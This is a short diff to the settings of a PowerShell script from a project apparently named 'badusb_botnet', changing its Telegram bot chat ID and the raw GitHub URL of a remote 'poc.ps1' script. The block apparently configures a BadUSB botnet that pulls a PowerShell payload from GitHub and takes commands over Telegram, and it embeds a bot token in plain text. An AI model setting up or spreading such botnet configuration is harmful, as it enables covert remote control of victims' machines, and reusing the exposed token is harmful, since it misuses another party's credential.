@@ -20,8 +20,8 @@ BOT TELEGRAM:
 ############
 
 $BotToken = "5853965757:AAHPd-K_MkcGmqM4U_I6YkdIFRuz-ETI5Fc"
-$ChatID = 'https://api.telegram.org/bot5853965757:AAHPd-K_MkcGmqM4U_I6YkdIFRuz-ETI5Fc/getUpdates'
-$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
+$ChatID = '870953487'
+$githubScript = 'https://raw.githubusercontent.com/leo562/badusb_botnet/master/poc.ps1'
 
 
 ###############
